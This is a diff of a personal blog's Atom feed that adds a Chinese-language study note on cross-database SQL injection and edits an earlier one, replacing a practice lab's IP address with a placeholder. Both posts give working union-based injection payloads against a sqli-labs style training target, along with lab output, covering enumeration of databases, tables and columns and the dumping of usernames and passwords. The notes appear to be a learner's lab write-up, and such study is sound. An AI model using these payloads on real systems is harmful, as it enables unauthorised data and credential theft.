@@ -2,13 +2,86 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Place-Serenity.github.io</id>
     <title>my blog</title>
-    <updated>2020-05-02T18:52:39.974Z</updated>
+    <updated>2020-05-04T16:08:39.170Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Place-Serenity.github.io"/>
     <link rel="self" href="https://Place-Serenity.github.io/atom.xml"/>
     <logo>https://Place-Serenity.github.io/images/avatar.png</logo>
     <icon>https://Place-Serenity.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, my blog</rights>
+    <entry>
+        <title type="html"><![CDATA[SQL注入笔记02]]></title>
+        <id>https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-02/</id>
+        <link href="https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-02/">
+        </link>
+        <updated>2020-05-04T16:06:30.000Z</updated>
+        <content type="html"><![CDATA[<p>跨库注入</p>
+<p>如果要应用跨库注入，有一个条件，那就是当前数据库用户必须为root用户，才可以对整个数据库进行操作</p>
+<p>确定用户：</p>
+<p>user()确定用户</p>
+<p>如果回显为root@localhost或者root@127.0.0.1只要@号前面为root，则代表该数据库用户为root</p>
+<p>跨库注入过程：</p>
+<p>第一步：</p>
+<p>获取当前所有的数据库：</p>
+<p>存有所有数据库的表名为：</p>
+<p>information_schema.schemata存储所有数据库</p>
+<p>schema_name数据库名</p>
+<p>获取当前所有数据库：</p>
+<p>union select 1,group_concat(schema_name),3 from information_schema.schemata</p>
+<p>/*<br>
+http://IP/Less-1/?id='<br>
+union select 1,group_concat(schema_name),3 from information_schema.schemata --+</p>
+<p>获取到了所有的数据库名：</p>
+<p>Welcome  Dhakkan<br>
+Your Login name: information_schema , challenges , mysql , performance_schema , security<br>
+Your Password:3</p>
+<p>*/</p>
+<p>第二步：</p>
+<p>获取你要注入的数据库的表名称：</p>
+<p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='pikachu'</p>
+<p>/*</p>
+<ol>
+<li>information_schema</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_C<br>
+Your Password:3</p>
+<p>emmmm正如所见，获得了一堆的表名。</p>
+<ol start="2">
+<li>challenges</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login name: PXOQBZZBNO<br>
+Your Password:3</p>
+<ol start="3">
+<li>mysql、</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: columns_priv,db,event,func,general_log,help_category,help_keyword,help_relation,help_topic,host,ndb_binlog_index,plugin,proc,procs_priv,proxies_priv,servers,slow_log,tables_priv,time_zone,time_zone_leap_second,time_zone_name,time_zone_transition,time_zone_transition_type,user<br>
+Your Password:3</p>
+<ol start="4">
+<li>performance_schema</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login  name: cond_instances,events_waits_current,events_waits_history,events_waits_history_long,events_waits_summary_by_instance,events_waits_summary_by_thread_by_event_name,events_waits_summary_global_by_event_name,file_instances,file_summary_by_event_name,file_summary_by_instance,mutex_instances,performance_timers,rwlock_instances,setup_consumers,set<br>
+Your Password:3</p>
+<ol start="5">
+<li>security</li>
+</ol>
+<p>Welcome  Dhakkan<br>
+Your Login name:emails,referers,uagents,users<br>
+Your Password:3</p>
+<p>*/</p>
+<p>第三步：</p>
+<p>获取你要注入的数据库的列名称：</p>
+<p>union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema='pikachu'</p>
+<p>第四步：</p>
+<p>获取你要注入的数据库的数据：</p>
+<p>union select 1,group_concat(username),group_concat(password) from pikachu.users</p>
+<p>跨库注入首先要获取所有数据库名称</p>
+<p><strong>在查询表名，列名时，必须限定你要注入的数据库名称</strong></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[SQL注入笔记01]]></title>
         <id>https://Place-Serenity.github.io/sql-zhu-ru-bi-ji-01/</id>
@@ -31,14 +104,14 @@
 <p>*/</p>
 <p>order by 4</p>
 <p>示例（华理ctf靶场）：</p>
-<p>http://39.105.84.217:40004/Less-1/?id='order by 4 --+</p>
+<p>http://IP/Less-1/?id='order by 4 --+</p>
 <p>得到报错Unknown column '4' in 'order clause'</p>
 <p>通过此报错，就可以确定mysql中，这个数据库的字段为3，所以，我们在使用mysql 进行联合查询时（union select），输入1,2,3进行攻击</p>
 <p>union select 1,2,3</p>
 <p><em><strong>如何查询数据？</strong></em></p>
 <p>第一步：获取当前数据库名称及当前数据库用户</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,2,3 --+</p>
+<p>http://IP/Less-1/?id='union select 1,2,3 --+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:2<br>
@@ -47,7 +120,7 @@ Your Password:3</p>
 <p>使用函数：database()，user()</p>
 <p>获取到，当前数据库名称为security，当前数据库操作用户为root</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,database(),user() --+</p>
+<p>http://IP/Less-1/?id='union select 1,database(),user() --+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:security<br>
@@ -64,14 +137,14 @@ Your Password:root@localhost</p>
 <p>union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'</p>
 <p>group_concat将查询到的数据都列出来</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/</p>
+<p>http://IP/Less-1/</p>
 <p>?id='union select 1,table_name,</p>
 <p>3 from information_schema.tables where table_schema='security' --+</p>
 <p>条件：where table_schema='security'</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:emails<br>
 Your Password:3（这里只输出了一个表名）</p>
-<p>http://39.105.84.217:40004/Less-1/</p>
+<p>http://IP/Less-1/</p>
 <p>?id='union select 1,group_concat(table_name),</p>
 <p>3 from information_schema.tables where table_schema='security' --+</p>
 <p>Welcome  Dhakkan<br>
@@ -79,11 +152,11 @@ Your Login name:emails,referers,uagents,users<br>
 Your Password:3</p>
 <p>emmm这里应该还是sql语法知识欠缺</p>
 <p>所以闹了一个笑话：</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name(),table_schema() --+</p>
+<p>http://IP/Less-1/?id='union select 1,table_name(),table_schema() --+</p>
 <p>尝试跟刚刚一样，直接让他输出出来,但是报错了</p>
 <p>原因是table_name是表名，不是一个函数</p>
 <p>换了一下，发现还是报错...</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,table_name,table_schema() --+</p>
+<p>http://IP/Less-1/?id='union select 1,table_name,table_schema() --+</p>
 <p>Welcome  Dhakkan<br>
 Unknown column 'table_name' in 'field list'</p>
 <p>(“字段列表”中的“表名”列未知)</p>
@@ -102,7 +175,7 @@ Your Password:3</p>
 <p>第四步：获取数据</p>
 <p>union select 1,group_concat(username),group_concat(password) from users</p>
 <p>/*</p>
-<p>http://39.105.84.217:40004/Less-1/?id='union select 1,group_concat(username),group_concat(password) from users--+</p>
+<p>http://IP/Less-1/?id='union select 1,group_concat(username),group_concat(password) from users--+</p>
 <p>显示：</p>
 <p>Welcome  Dhakkan<br>
 Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4<br>
